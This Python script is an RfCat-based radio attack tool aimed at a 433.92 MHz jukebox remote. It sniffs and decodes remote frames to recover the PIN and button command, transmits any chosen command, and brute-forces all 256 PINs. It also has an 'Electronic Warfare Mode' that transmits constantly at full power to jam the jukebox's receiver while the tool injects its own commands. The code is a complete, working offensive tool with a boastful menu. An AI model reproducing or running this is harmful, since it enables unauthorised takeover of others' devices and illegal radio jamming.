#!/usr/bin/python

from rflib import *
import datetime
import time
import sys
import os

banner = """
    _____ _            _____               
   |_   _| |__   ___  |  ___|__  _ __  ____
     | | | '_ \ / _ \ | |_ / _ \| '_ \|_  /
     | | | | | |  __/ |  _| (_) | | | |/ / 
     |_| |_| |_|\___| |_|  \___/|_| |_/___| V1.0

"Arthur, it's morning, have you been here all night?" """

#Variables
ewMode = False

COMMANDS = {'On_Off': 0x78,
            'Pause': 0x32, #0xB3,
            'P1': 0x70, #0xF1,
            'P2_Edit_Queue': 0x60,
            'P3_Skip': 0xCA,
            'F1_Restart': 0x20,
            'F2_Key': 0xA0,
            'F3_Mic_A_Mute': 0x30,
            'F4_Mic_B_Mute': 0xB0,
            'Mic_Vol_Plus_Up_Arrow': 0xF2,
            'Mic_Vol_Minus_Down_Arrow': 0x80,
            'A_Left_Arrow': 0x84,
            'B_Right_Arrow': 0xC4,
            'OK': 0x44, #0xDD,
            'Music_Vol_Zone_1Up': 0xD0, #0xF4,
            'Music_Vol_Zone_1Down': 0x50,
            'Music_Vol_Zone_2Up': 0x90, #0xF6,
            'Music_Vol_Zone_2Down': 0x10,
            'Music_Vol_Zone_3Up': 0xC0, #0xFC,
            'Music_Vol_Zone_3Down': 0x40,
            '1': 0xF0,
            '2': 0x08,
            '3': 0x88,
            '4': 0x48,
            '5': 0xC8,
            '6': 0x28,
            '7': 0xA8,
            '8': 0x68,
            '9': 0xE8,
            '0': 0x98,
            'Music_Karaoke(*)': 0x18,
            'Lock_Queue(#)': 0x58}

def encode(pin, command):
        #Syncword
        frame = 0x5D
        
        #PIN
        for bit in range(8):
                frame <<= 1
                if pin&(1<<bit):
                        frame |= 1
                                #Insert button code and it's complement
        frame <<= 16
        frame |= (command << 8)
        frame |= (command ^ 0xFF)

        #Convert to raw signal
        #0 symble == 10 && 1 symble == 1000
        ook = ""
        for i in range(8+8+16):
                if (frame & 0x80000000):
                        ook +="1000"
                        frame <<=1
                else:
                        ook += "10"
                        frame <<=1

        #Build msg
        #Yah.... This looks bad but it converts string binary to unicode >_<
        ook = "111111111111111100000000" + ook + "1000"
        ook = hex(int(ook,2))[2:-1]
        if len(ook) % 2 == 1:
                ook += '0'
        ook = ook.decode('hex')  

        return ook

def decode(msg):
        #Strip tail, preamble is stripbed before passed to this function
        #msg = msg [24:-4] #Test
        msg = msg [:90] #Live
        
        #Convert ook to NEC
        msg = msg.replace("1000", "1")
        msg = msg.replace("10", "0")

        #Strip sync word
        msg = msg[8:]
        
        #Find command
        command = msg[8:16]
        command = int(command,2) #Str to bin
        for key, item in COMMANDS.items():
                if item == command:
                        command = key
        #PIN
        pin = msg[:8]
        pin = int(pin[::-1],2) #Bin to int, Little endian to Big endian 

        return pin, command, msg

#looks for the preamble FFFF00A2888A2
#FFFF is cut off by d.setMdmSyncWord()
def verifyPkt(pkt): 
        if ord(pkt[0]) != 0x00:
                return False
        if ord(pkt[1]) != 0xa2:
                return False
        if ord(pkt[2]) != 0x88:
                return False
        if ord(pkt[3]) != 0x8A:
                return False
        return True

def scan(d):
        global ewMode
        ewMode = False
        youOkMadisonPub()#Kills EW Mode
        
        d.setModeRX()
        d.setFreq(433.92e6)
        d.setMdmModulation(MOD_ASK_OOK)
        d.setMdmDRate(1766)
        d.setPktPQT(0)
        d.setMdmSyncMode(2)
        d.setMdmSyncWord(0x00ffff) #FFFF is the beging of the preamble and won't be displayed, rflib assumes you know it's there when you set this variable.
        d.setMdmNumPreamble(0)
        d.makePktFLEN(16)

        print "\n-=Hit <ENTER> to stop=-"

        while not keystop():
                pkt, ts = d.RFrecv() #RX packet and timestamp
                try:
                        if verifyPkt(pkt):

                                msg = '{:b}'.format(int(pkt.encode('hex'),16)) #Strips leding 0's, unicode to str bin
                                pin, command, dMsg = decode(msg)
                                time = datetime.datetime.fromtimestamp(ts).strftime('%H:%M:%S')
                                print "<*> %s: TX:Preamble + Sync + %s PIN:%s  Command: %s"  % (time,dMsg,pin,command) 

                except ChipconUsbTimeoutException:
                        pass
                
        null = raw_input() #Nulls out enter durring a keystop


def tx(msg, repeat=0):
        if ewMode == True:
                youOkMadisonPub()
                        
        d.setFreq(433.92e6)
        d.setMdmModulation(MOD_ASK_OOK)
        d.setMdmDRate(1766)
        d.setMdmNumPreamble(0) 
        d.setMdmSyncMode(0)
        d.setMaxPower()
        d.RFxmit(msg, repeat)

        if ewMode == True:
                darnYouMadisonPub()


#Trys every PIN for a command
def bruteForceThisDude(command, keyButton):
        coolDown = "0000" #Gap inbetween each msg
        coolDown = coolDown.decode('hex') #decode to unicode

        #Sick intro!
        os.system('clear')
        print "\n\"What day is today?\" asked Pooh"
        time.sleep(1)
        print "\"It's the day we burn this motherf***** to the ground.\" squeaked Piglet"
        time.sleep(2)
        print "\"My favorite day.\" said Pooh\n"
        time.sleep(1.5)
        print "<*> BRUTE FORCE IN PROGRESS..."

        start = int(time.time())

        #Group send
        groupCommand = ''
        pinX = 0
        for pin in range(256):
                part = encode(pin, command)
                if len(groupCommand) <= 255-len(part + coolDown):
                        groupCommand += part + coolDown
                else:
                        print "<*> TX PINs " + str(pinX) + "-" + str(pin)
                        pinX = pin
                        tx(groupCommand)
                        groupCommand = ''
                        groupCommand += part + coolDown
        print "<*> TX PINs " + str(pinX) + "-" + str(pin)
        tx(groupCommand)
        
##        #One at a time        
##        for pin in range(256):
##                fullCommand = encode(pin, command)
##                print "<TX> Command: "+ keyButton + " PIN: " + str(pin)
##                tx(fullCommand, 2)
                
        stop = int(time.time())
        totalTime = stop-start
        raw_input("\n<*> YOUR BADASS ADVENTURE IN HACKING IS COMPLETE! TIME: %isec. \n\nPress ENTER to continue..." %(totalTime))
        loop2 = False
        return
                        
def darnYouMadisonPub():
        d.setModeIDLE()
        d.setMaxPower()
        d.setRFRegister(PA_TABLE0, 0xFF) #PA_TABLE 0 and 1 has to do with the CC1111 OOK
        d.setRFRegister(PA_TABLE1, 0XFF) #0xFF tx's constantly
        d.setFreq(433.92e6)
        d.setModeTX()
        print "<*> Jamming at 433.92 MHz"

def youOkMadisonPub():
        d.setModeIDLE()
        d.setRFRegister(PA_TABLE0, 0x00)
        d.setRFRegister(PA_TABLE1, 0x00)


#Menues 
def mainMenu():
        loop = True
        while loop:
                if ewMode == True:
                        mode = "\033[91m" + "ON" + "\033[0m"
                else:
                        mode = "\033[92m" + "OFF" + "\033[0m"
                        
                os.system('clear')
                print(banner)
                print '''\n -=Main Menu=-
1.) Scan
2.) TX
3.) Electronic Warfare Mode (%s)
4.) Exit \n'''%(mode)

                try:
                        menuAns=raw_input('Select [1-4]: ')
                        if int(menuAns) == 1:
                                scan(d)
                        elif int(menuAns) == 2:
                                txMenu()
                        elif int(menuAns) == 3:
                                ewMenu()
                        elif int(menuAns) == 4:
                                youOkMadisonPub()
                                sys.exit()
                        else: 
                                print "Not a valid choice, please try again... \n"
                                time.sleep(.5)        
                except ValueError:
                        print "Not a valid choice, please try again... \n"
                        time.sleep(.5)
                        pass

def txMenu():
        pin = pinMenu()
        if pin == 999:
                bruteMenu()
                return

        command, keyButton = commandMenu()
        if command == False:   ##Brakes loop if choice 33 (Back) is selected
                return
        
        repeat = timesMenu()
        fullCommand = encode(pin, command) #Str binary to bin

        loop = True
        while loop:
                print "\n<*> WARNING! YOU'RE ABOUT TO DO SOME COOL THINGS!"
                txAns = raw_input("Are you cool like the Fonz to TX '" + keyButton + "' " + repeat + " times? [Y/N]:")
                if txAns.lower() == 'n':
                        loop = False
                elif txAns.lower() == 'y':
                        flag = True
                        while flag:
                                print '<*> TXing...\n'
                                tx(fullCommand, int(repeat)-1) #Dose the thing with the radio thing
                                reTransmit = raw_input("TX Again? [Y/N]")
                                if reTransmit.lower() == 'n':
                                        flag = False
                                        return
                                elif reTransmit.lower() == 'y':
                                        flag = True
                                else:
                                        flag = False
                                        return
                else:
                        print "\nNaw, you don goofed and you're not cool... Please try again thou! :D"
                        youOkMadisonPub()   
                        sys.exit()

def pinMenu():
        loop = True
        while loop:
                try:
                        pinAns = raw_input("\nWhich PIN do you want to use? [000-255] [999 to Brute Force]: ")
                        print "\n"
                        if int(pinAns) <=255:
                                loop = False
                                return int(pinAns)
                        elif int(pinAns) == 999:
                                return int(pinAns)
                        else:
                                print "Not a valid choice, please try again... \n"
                                time.sleep(.5)     
                except ValueError:
                        print "Not a valid choice, please try again... \n"
                        time.sleep(.5)
                        pass

def commandMenu():
        global keyButton
        items = COMMANDS.keys()
        items.sort(reverse=1)

        for i in range(len(items)-16):
                offset = 29 - len(str(i+1)+items[i])+3
                gap = 10 + offset
                print str(i+1) + ".) " + items[i] + " "*gap  + str(i+17) + ".) " + items[i+16] 
        print "\n33.) Back \n"

        #Input handling
        while True:
                try:
                        commandAns = raw_input('Pick a command. Select [1-33]: ')
                        if int(commandAns) <= 32 and int(commandAns) >= 1:
                                keyButton = items[int(commandAns)-1] #the chosen command in the items list
                                value = COMMANDS[str(keyButton)]
                                return value, keyButton
                        elif int(commandAns) == 33:
                                return False, False
                        else:
                                print "Not a valid choice, please try again... \n"
                                time.sleep(.5)                                
                except ValueError:
                        print "Not a valid choice, please try again... \n"
                        time.sleep(.5)
                        pass
        
def timesMenu():
        loop = True
        while loop:
                try:       
                        timesAns=raw_input("\nTX how many times? [1-65535]: ")
                        if int(timesAns) <= 65535:
                                        times = int(timesAns)
                                        loop = False
                                        return str(times)
                        else: 
                                print "Not a valid choice, please try again... \n"
                                time.sleep(.5)                       
                except ValueError:
                        print "Not a valid choice, please try again... \n"
                        time.sleep(.5)
                        pass        

def bruteMenu():
        value, keyButton = commandMenu()
        if value == False:   ##Brakes loop if choice 33 (Back) is selected
                return

        while True:
                print "\n<*> WARNING! YOU'RE ABOUT TO DO SOME COOL THINGS!"
                txAns = raw_input("Are you cool like the Fonz to brute force this thing? [Y/N]:")
                if txAns.lower() == 'n':
                        #loop2 = False
                        return
                elif txAns.lower() == 'y':
                        bruteForceThisDude(value, keyButton)
                        return
                else:
                        print "\nNaw, you don goofed and you're not cool... Please try again thou! :D"
                        youOkMadisonPub()
                        sys.exit()

def ewMenu():
        global ewMode
        loop = True
        while loop:
                try:
                        if ewMode == False:
                                print "\n<*> Electronic Warfare Mode will JAM the receiver while still"
                                print "    allowing you to send commands to the Juke Box."
                                print "<*> This mode stops when you 'Scan'."
                                ewAns = raw_input("Start EW Mode? [Y/N]: ")
                                if ewAns.lower() == 'n':
                                        loop = False
                                        return
                                elif ewAns.lower() == 'y':
                                        loop = False
                                        ewMode = True
                                        darnYouMadisonPub()
                                        return
                                else:
                                        print "Not a valid choice, please try again... "
                                        time.sleep(.5)
                        else:
                                ewAns = raw_input("Stop EW Mode? [Y/N]: ")
                                if ewAns.lower() == 'n':
                                        loop = False
                                        return
                                elif ewAns.lower() == 'y':
                                        loop = False
                                        ewMode = False
                                        youOkMadisonPub()
                                        return
                                else:
                                        print "Not a valid choice, please try again..."
                                        time.sleep(.5)
                except ValueError:
                        print "Not a valid choice, please try again... \n"
                        time.sleep(.5)
                        pass

if __name__ == '__main__':
        d = RfCat(idx=0)
        mainMenu()
